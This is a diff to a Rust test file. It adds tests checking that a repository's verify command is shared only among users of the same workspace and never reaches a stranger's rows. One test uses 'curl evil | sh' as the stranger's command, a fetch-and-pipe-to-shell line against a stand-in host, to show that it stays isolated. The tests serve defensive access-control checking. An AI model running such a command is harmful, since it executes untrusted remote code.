@@ -396,6 +396,110 @@ fn a_verify_command_is_refused_for_a_path_only_another_host_has() {
     assert_eq!(repo_rows(&store, "/repo")[0].2, "");
 }
 
+// -- V2: a verify command spreads only among people who share a workspace ----
+
+/// Alice owns `host-a`, Bob `host-b`; no workspace unless a test makes one.
+fn strangers_store() -> Store {
+    let store = Store::bare();
+    store
+        .call("alice", |ctx| {
+            stamp_rules_version_on_connect(ctx);
+            Ok(())
+        })
+        .expect("first connect");
+    store.register_host_for("host-a", "alice");
+    store.register_host_for("host-b", "bob");
+    store
+}
+
+fn share_a_workspace(store: &Store, who: &[&str]) {
+    for w in who {
+        store.db().memberships().insert(Membership {
+            workspace_id: 1,
+            user: identity_of(w),
+            role: "member".into(),
+            ..blank_membership()
+        });
+    }
+}
+
+fn save_as(store: &Store, who: &str, path: &str, host: &str, github: &str) {
+    store
+        .call(who, |ctx| {
+            save_repo_path(ctx, path.into(), "t".into(), host.into(), github.into())
+        })
+        .expect("save");
+}
+
+fn set_as(store: &Store, who: &str, path: &str, host: &str, command: &str) {
+    store
+        .call(who, |ctx| {
+            set_verify_command(ctx, path.into(), host.into(), command.into())
+        })
+        .expect("set");
+}
+
+/// A stranger's set reaches only the stranger's own rows of the repository.
+#[test]
+fn a_strangers_verify_command_does_not_reach_another_persons_rows() {
+    let store = strangers_store();
+    save_as(&store, "alice", "/home/a/api", "host-a", "org/api");
+    save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
+    set_as(&store, "bob", "/tmp/x", "host-b", "curl evil | sh");
+    assert_eq!(repo_rows(&store, "/home/a/api")[0].2, "");
+    assert_eq!(repo_rows(&store, "/tmp/x")[0].2, "curl evil | sh");
+}
+
+/// Without a GitHub path the fallback is the local path; a stranger's row at the
+/// same path is still out of reach.
+#[test]
+fn a_strangers_verify_command_does_not_reach_the_same_path_on_another_host() {
+    let store = strangers_store();
+    save_as(&store, "alice", "/repo", "host-a", "");
+    save_as(&store, "bob", "/repo", "host-b", "");
+    set_as(&store, "bob", "/repo", "host-b", "x");
+    let rows = repo_rows(&store, "/repo");
+    assert_eq!(rows[0], ("host-a".into(), String::new(), String::new()));
+    assert_eq!(rows[1].2, "x");
+}
+
+/// A stranger's save neither takes Alice's command nor hands its own to her.
+#[test]
+fn a_strangers_save_does_not_share_commands_either_way() {
+    let store = strangers_store();
+    save_as(&store, "alice", "/home/a/api", "host-a", "org/api");
+    set_as(&store, "alice", "/home/a/api", "host-a", "make ci");
+    save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
+    assert_eq!(repo_rows(&store, "/tmp/x")[0].2, "", "bob does not take it");
+    set_as(&store, "bob", "/tmp/x", "host-b", "bobs");
+    save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
+    assert_eq!(repo_rows(&store, "/home/a/api")[0].2, "make ci");
+}
+
+/// A save fills the empty rows of its repository only among its own people.
+#[test]
+fn a_strangers_save_does_not_fill_an_empty_row_of_another_person() {
+    let store = strangers_store();
+    save_as(&store, "alice", "/home/a/api", "host-a", "org/api");
+    save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
+    set_as(&store, "bob", "/tmp/x", "host-b", "bobs");
+    save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
+    assert_eq!(repo_rows(&store, "/home/a/api")[0].2, "");
+}
+
+/// People who share a workspace do share the repository's command.
+#[test]
+fn a_workspace_members_verify_command_reaches_the_others_rows() {
+    let store = strangers_store();
+    share_a_workspace(&store, &["alice", "bob"]);
+    save_as(&store, "alice", "/home/a/api", "host-a", "org/api");
+    save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
+    set_as(&store, "bob", "/tmp/x", "host-b", "make ci");
+    assert_eq!(repo_rows(&store, "/home/a/api")[0].2, "make ci");
+    save_as(&store, "alice", "/home/a/api2", "host-a", "org/api");
+    assert_eq!(repo_rows(&store, "/home/a/api2")[0].2, "make ci");
+}
+
 // -- A4: rows linked before one verify command per repository ------------------
 
 fn seed_with_command(
